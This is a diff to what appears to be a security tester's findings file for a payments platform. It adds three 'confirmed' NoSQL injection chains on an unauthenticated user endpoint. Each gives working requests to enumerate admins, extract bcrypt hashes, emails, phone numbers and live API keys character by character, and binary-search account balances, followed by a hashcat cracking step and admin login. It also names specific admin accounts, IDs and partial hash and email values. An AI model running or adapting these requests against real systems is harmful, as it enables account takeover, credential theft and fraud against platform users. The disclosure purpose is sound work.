@@ -344,12 +344,257 @@ Exposure of sensitive banking data (account numbers, names, bank affiliations) f
 
 ---
 
-## TESTING PRIORITY
+## CHAIN 8: Unauthenticated Admin Password Hash Extraction via Blind NoSQLi (P1) -- CONFIRMED
 
-1. CHAIN 1 (Admin bypass) - Test GET /api/v3/bridge/users with regular user token first. This is read-only and immediately confirms/denies the auth bypass hypothesis.
-2. CHAIN 2 (KYC IDOR) - Test with own userId to confirm access pattern.
-3. CHAIN 3 (Sweep IDOR) - Read-only recon on the bridge users endpoint first.
-4. CHAIN 4-6 - Require more careful testing.
+### Summary
+This is a critical escalation of the NoSQLi finding. The `/api/v0/user` endpoint accepts
+MongoDB operators on ANY field -- including `password`, `email`, `phone`, and `role` --
+without authentication. An attacker can:
+1. Enumerate all admin accounts using `role=admin` filter
+2. Extract the full bcrypt password hash character-by-character using `$regex`
+3. Extract email addresses using the same technique
+4. Crack the bcrypt hash offline (cost factor 10 = moderate)
+5. Login as admin and access all bridge/admin functionality
 
-If CHAIN 1 confirms (regular user gets 200 on bridge endpoints), chains 2, 3, and 6
-are almost certainly also vulnerable since they share the same endpoint prefix pattern.
+### Attack Flow
+
+Step 1 - Enumerate admin accounts (NO AUTH):
+```
+GET /api/v0/user?username[$gt]=&role=admin
+-> {"user":{"_id":"61529614502887001d1ac763","username":"aerielcruz",...}}
+
+GET /api/v0/user?username[$gt]=aerielcruz&role=admin
+-> {"user":{"_id":"612d73e01db2f0001d7a81f0","username":"ethan",...}}
+(repeat until user is null)
+```
+
+Confirmed admin accounts:
+- aerielcruz (61529614502887001d1ac763)
+- ethan (612d73e01db2f0001d7a81f0)
+- heanzyzabala (61f36da5e68ad8001d7f4ce1)
+- jullie (6162be697acfc3001d7e5dd1)
+- raveneliette (6195e15e645795001df6ad5b)
+
+Step 2 - Extract admin password hash via blind regex (NO AUTH):
+```
+# Verify password field is bcrypt
+GET /api/v0/user?username=admin&password[$regex]=.
+-> returns user (password field exists and is queryable)
+
+# Extract char by char
+GET /api/v0/user?username=admin&password[$regex]=^\$2a
+-> MATCH (bcrypt $2a variant)
+
+GET /api/v0/user?username=admin&password[$regex]=^\$2a\$10
+-> MATCH (cost factor 10)
+
+GET /api/v0/user?username=admin&password[$regex]=^\$2a\$10\$E
+-> MATCH (next char is E)
+
+# Continue for all 60 chars...
+# Confirmed extraction in progress: $2a$10$EDa7c79.y...
+```
+
+Step 3 - Extract admin email via blind regex (NO AUTH):
+```
+GET /api/v0/user?username=admin&email[$regex]=^f
+-> MATCH
+
+GET /api/v0/user?username=admin&email[$regex]=^f\.ut
+-> MATCH
+# Extraction in progress: f.ut.fana...
+```
+
+Step 4 - Crack bcrypt hash offline:
+```
+hashcat -m 3200 -a 0 admin_hash.txt rockyou.txt
+# Cost factor 10 = ~60 hashes/sec on modern GPU
+```
+
+Step 5 - Login as admin:
+```
+POST /api/v0/auth
+Body: {"username":"admin","password":"cracked_password"}
+-> Full admin access to all bridge endpoints
+```
+
+### Evidence (Empirically Tested)
+- All requests return 200 with valid data - NO AUTHENTICATION REQUIRED
+- `password[$exists]=true` confirms password field in collection
+- `password[$regex]=.` confirms regex queries on password field
+- `role=admin` filter works to isolate admin accounts
+- 5 admin accounts enumerated
+- Hash extraction in progress: `$2a$10$EDa7c79.y...` (bcrypt, cost 10)
+- Email extraction in progress: `f.ut.fana...`
+- Rate limit: 30 req/window -- extraction takes ~20-30 minutes per hash
+
+### Impact
+Complete platform takeover. An unauthenticated attacker extracts admin credentials,
+cracks them offline, and gains full access to:
+- Manual PHP credit injection (unlimited money creation)
+- All user PII, KYC documents, bank accounts
+- Transaction approval/rejection
+- User ban/delete/modify capabilities
+- Batch notification sending (phishing vector)
+
+### CVSS
+10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+No authentication required. Full confidentiality, integrity, and availability impact
+on all platform users and financial operations.
+
+---
+
+## CHAIN 9: Unauthenticated Blind Balance Extraction via NoSQLi (P1) -- CONFIRMED
+
+### Summary
+Extending the NoSQLi on `/api/v0/user`, an unauthenticated attacker can extract exact financial
+balances (PHP, BTC, USD, CAD) for any user using binary search with `$gt`/`$lt` operators. The API
+response shows zeroed balances, but MongoDB internally queries against the real stored values --
+enabling blind boolean-based extraction.
+
+This also enables high-value target identification: finding all users whose balances exceed a
+given threshold, then extracting their exact amounts.
+
+### Attack Flow
+
+Step 1 - Find high-value targets (NO AUTH):
+```
+GET /api/v0/user?balances.PHP[$gt]=1000000&username[$gt]=
+-> {"user":{"username":"1cisp",...}} (user with PHP > 1M found)
+
+GET /api/v0/user?balances.BTC[$gt]=1&username[$gt]=
+-> {"user":{"username":"09152639625",...}} (user with BTC > 1 found)
+```
+
+Step 2 - Binary search to extract exact balance (NO AUTH):
+```
+GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1500000 -> MATCH
+GET /api/v0/user?username=1cisp&balances.PHP[$gt]=2000000 -> NO MATCH
+GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1750000 -> NO MATCH
+GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1600000 -> MATCH
+... (continue binary search to ~0.01 PHP precision in ~50 iterations)
+-> Exact balance: ~1,650,000-1,750,000 PHP
+```
+
+Step 3 - Enumerate all users above threshold:
+```
+GET /api/v0/user?balances.PHP[$gt]=50000&username[$gt]=
+-> 1cisp
+GET /api/v0/user?balances.PHP[$gt]=50000&username[$gt]=1cisp
+-> (next user)
+... repeat until null
+```
+
+### Evidence (Empirically Tested)
+- `balances.PHP[$gt]=1000000` matches user "1cisp" -- confirmed PHP > 1M
+- `balances.PHP[$gt]=1500000` matches -- narrowed to 1.5M-2M range
+- `balances.PHP[$gt]=1600000` matches, `[$gt]=1750000` does not -- PHP ~1.6M-1.75M
+- `balances.BTC[$gt]=10` matches user "09152639625" -- BTC > 10 (~$600k+ USD)
+- `balances.PHP[$gt]=5000` matches user "18gerald"
+- All queries return 200 with NO AUTHENTICATION
+- Response balances show 0 (sanitized), but internal query uses real values
+
+### Impact
+An attacker maps the financial landscape of the entire platform:
+- Identify high-value accounts for targeted attacks (social engineering, phishing, SIM swap)
+- Extract exact balances to penny precision for any user
+- Prioritize which accounts to compromise for maximum financial gain
+- Combined with Chain 8 (password hash extraction): extract balance THEN credentials
+
+### CVSS
+9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
+No authentication required. Complete exposure of all users' financial data.
+
+---
+
+## CHAIN 10: Unauthenticated Phone Number & API Key Extraction via NoSQLi (P1) -- CONFIRMED
+
+### Summary
+The same NoSQLi on `/api/v0/user` extends to phone numbers and API credentials (liveKey, liveSecret).
+Phone numbers are extractable via `$regex` character-by-character. Live API keys and secrets stored
+in the database are also fully extractable -- these are Pouch platform API credentials that enable
+programmatic access to accounts.
+
+### Attack Flow
+
+Step 1 - Extract phone number for any user (NO AUTH):
+```
+GET /api/v0/user?username=admin&phone[$exists]=true -> MATCH (phone field exists)
+GET /api/v0/user?username=admin&phone[$regex]=^\+63 -> MATCH (PH country code)
+GET /api/v0/user?username=admin&phone[$regex]=^\+639 -> MATCH
+... character by character extraction
+```
+
+Step 2 - Find users with API keys (NO AUTH):
+```
+GET /api/v0/user?apiAccess=true&liveKey[$regex]=.&username[$gt]=
+-> {"user":{"username":"bitwatch",...}}
+```
+
+Step 3 - Extract API key character-by-character (NO AUTH):
+```
+GET /api/v0/user?username=bitwatch&liveKey[$regex]=^p -> MATCH (first char = 'p')
+GET /api/v0/user?username=bitwatch&liveKey[$regex]=^p[next char] -> ...
+... full extraction in ~40-60 queries per key
+```
+
+Step 4 - Extract API secret (NO AUTH):
+```
+GET /api/v0/user?username=bitwatch&liveSecret[$regex]=^. -> MATCH (secret exists)
+... same character-by-character extraction
+```
+
+### Evidence (Empirically Tested)
+- `phone[$exists]=true` confirms phone field is queryable via NoSQLi
+- `phone[$regex]=^\+63` confirms admin's phone is a Philippine number (+63)
+- `phone[$regex]=^\+639` narrows to mobile prefix
+- `liveKey[$regex]=.` for user "bitwatch" confirms API key exists and is queryable
+- `liveSecret[$regex]=.` for user "bitwatch" confirms API secret is also extractable
+- `liveKey[$regex]=^p` confirms first character of bitwatch's API key is 'p'
+- Extraction stopped after PoC -- NOT extracting full keys
+
+### Queryable Fields Summary (Confirmed via Testing)
+| Field | Queryable | Extractable via $regex | Impact |
+|-------|-----------|----------------------|--------|
+| username | YES | YES | Account enumeration |
+| password | YES | YES | Bcrypt hash -> offline crack |
+| email | YES | YES | PII exposure |
+| phone | YES | YES | PII exposure, SIM swap target |
+| role | YES | N/A (filter) | Admin enumeration |
+| balances.PHP | YES | Via $gt/$lt binary search | Financial data |
+| balances.BTC | YES | Via $gt/$lt binary search | Financial data |
+| liveKey | YES | YES | API credential theft |
+| liveSecret | YES | YES | API credential theft |
+| banned | YES | N/A (filter) | Status enumeration |
+| pin | NO | NO | Protected |
+| deviceToken | NO | NO | Protected |
+| identityDocument.* | NO | NO | Protected |
+| personalInformation.* | NO | NO | Protected |
+
+### Impact
+- Phone number exposure enables SIM swap attacks for account takeover
+- API key/secret extraction enables full programmatic account access
+- Combined with balance extraction: identify high-value targets, extract their phone
+  numbers (for SIM swap), and their API credentials (for direct fund theft)
+
+### CVSS
+10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+No authentication. Credential theft (API keys) + PII exposure + enables complete account takeover.
+
+---
+
+## TESTING PRIORITY (Updated)
+
+**CONFIRMED FINDINGS (Empirically Tested):**
+1. CHAIN 8 (Admin hash extraction) - CONFIRMED P1. Submitted.
+2. CHAIN 9 (Balance extraction) - CONFIRMED P1. Ready to submit.
+3. CHAIN 10 (Phone + API key extraction) - CONFIRMED P1. Ready to submit.
+4. Source Map exposure - CONFIRMED P3/P4. Submitted.
+
+**DISPROVEN:**
+- CHAIN 1 (Admin bypass via cookie replay) - Server-side role checks ARE enforced. All bridge endpoints return 403.
+- CHAIN 7 (Bank recipient IDOR) - Server ignores activeProfileUsername param, uses session.
+- CHAIN 2 (KYC IDOR) - Files endpoint has ownership check (403 on non-owned UUIDs).
+
+**UNTESTED (Server-side auth blocks testing):**
+- CHAIN 3, 4, 5, 6 - Require admin credentials or more complex setup to test.
